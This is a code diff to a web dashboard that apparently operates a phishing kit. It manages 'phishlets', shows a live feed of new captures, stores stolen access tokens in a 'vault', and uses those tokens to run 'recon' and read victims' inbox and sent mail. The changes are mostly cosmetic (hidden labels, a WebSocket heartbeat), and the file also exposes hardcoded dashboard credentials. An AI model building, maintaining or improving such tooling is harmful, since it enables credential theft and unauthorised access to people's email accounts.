@@ -9,7 +9,7 @@
     <!-- Chart.js -->
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
-        /* ── Global Styles ── */
+        /* ── Same styles as before (unchanged) ── */
         @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -208,7 +208,9 @@
     <!-- ==================== TAB: Dashboard ==================== -->
     <div id="tab-dashboard" class="tab-content active">
         <div class="toolbar glass">
+            <label for="searchInput" style="display:none;">Search</label>
             <input type="text" id="searchInput" placeholder="Search by username, IP, domain..." oninput="filterTable()">
+            <label for="filterDate" style="display:none;">Filter</label>
             <select id="filterDate" onchange="filterTable()">
                 <option value="all">All Time</option>
                 <option value="today">Today</option>
@@ -354,6 +356,7 @@
     <!-- ==================== TAB: Recon ==================== -->
     <div id="tab-recon" class="tab-content">
         <div class="toolbar glass">
+            <label for="reconToken" style="display:none;">Access Token</label>
             <input type="text" id="reconToken" placeholder="Access Token..." style="flex:2; min-width:200px;">
             <button class="btn btn-primary" onclick="doRecon()">🔍 Recon</button>
             <button class="btn btn-success" onclick="loadReconFromVault()">📥 From Vault</button>
@@ -367,8 +370,11 @@
     <!-- ==================== TAB: Webmail ==================== -->
     <div id="tab-webmail" class="tab-content">
         <div class="toolbar glass">
+            <label for="webmailToken" style="display:none;">Access Token</label>
             <input type="text" id="webmailToken" placeholder="Access Token..." style="flex:2; min-width:200px;">
+            <label for="webmailFolder" style="display:none;">Folder</label>
             <select id="webmailFolder"><option value="inbox">Inbox</option><option value="sent">Sent</option></select>
+            <label for="webmailLimit" style="display:none;">Limit</label>
             <input type="number" id="webmailLimit" value="20" style="width:80px;">
             <button class="btn btn-primary" onclick="loadWebmail()">📧 Load Emails</button>
             <button class="btn btn-success" onclick="loadWebmailFromVault()">📥 From Vault</button>
@@ -464,7 +470,6 @@
 
     function getAuthHeader() {
         if (authHeader) return authHeader;
-        // Prompt for credentials once
         const user = prompt('Dashboard Username:', 'svrpsdev');
         const pass = prompt('Dashboard Password:', 'Cozysarps18!');
         authHeader = 'Basic ' + btoa(user + ':' + pass);
@@ -486,27 +491,45 @@
     }
 
     // ============================================================
-    // WEBSOCKET (for live updates)
+    // WEBSOCKET (with startHeartbeat defined)
     // ============================================================
+    let heartbeatInterval;
+
+    function startHeartbeat() {
+        if (heartbeatInterval) clearInterval(heartbeatInterval);
+        heartbeatInterval = setInterval(() => {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send('ping');
+            }
+        }, 25000);
+    }
+
     function connectWebSocket() {
-    const wsProtocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
-    ws = new WebSocket(wsProtocol + location.host + '/ws');  // <-- changed
-    const dot = document.getElementById('wsDot'), label = document.getElementById('wsLabel');
-    ws.onopen = () => { dot.className = 'ws-dot online'; label.textContent = 'Live'; reconnectAttempts = 0; startHeartbeat(); };
-    ws.onclose = () => {
-        dot.className = 'ws-dot offline'; label.textContent = 'Disconnected';
-        if (reconnectAttempts < maxReconnectAttempts) {
-            reconnectAttempts++;
-            setTimeout(connectWebSocket, Math.min(5000 + reconnectAttempts * 1000, 30000));
-        }
-    };
-    ws.onmessage = (e) => {
-        try {
-            const data = JSON.parse(e.data);
-            if (data.type === 'newLog') { showToast('📥 New capture: ' + data.file); refreshLogs(); }
-        } catch (e) {}
-    };
-}
+        const wsProtocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
+        ws = new WebSocket(wsProtocol + location.host + '/ws');
+        const dot = document.getElementById('wsDot'), label = document.getElementById('wsLabel');
+        ws.onopen = () => {
+            dot.className = 'ws-dot online';
+            label.textContent = 'Live';
+            reconnectAttempts = 0;
+            startHeartbeat();
+        };
+        ws.onclose = () => {
+            dot.className = 'ws-dot offline';
+            label.textContent = 'Disconnected';
+            if (reconnectAttempts < maxReconnectAttempts) {
+                reconnectAttempts++;
+                setTimeout(connectWebSocket, Math.min(5000 + reconnectAttempts * 1000, 30000));
+            }
+        };
+        ws.onmessage = (e) => {
+            try {
+                const data = JSON.parse(e.data);
+                if (data.type === 'newLog') { showToast('📥 New capture: ' + data.file); refreshLogs(); }
+            } catch (e) {}
+        };
+    }
+
     // ============================================================
     // FLAG HELPER
     // ============================================================
@@ -898,7 +921,12 @@
                     <td style="font-size:12px;color:rgba(255,255,255,0.4);">${p.file}</td>
                     <td style="font-size:12px;color:rgba(255,255,255,0.4);">${p.entryPoint}</td>
                     <td><span class="badge ${p.enabled ? 'badge-success' : 'badge-danger'}">${p.enabled ? '✅ Enabled' : '❌ Disabled'}</span></td>
-                    <td><label class="switch"><input type="checkbox" ${p.enabled ? 'checked' : ''} onchange="togglePhishlet('${id}', this.checked)"><span class="slider"></span></label></td>
+                    <td>
+                        <label class="switch" for="switch-${id}">
+                            <input type="checkbox" id="switch-${id}" ${p.enabled ? 'checked' : ''} onchange="togglePhishlet('${id}', this.checked)">
+                            <span class="slider"></span>
+                        </label>
+                    </td>
                 `;
                 tbody.appendChild(row);
             });
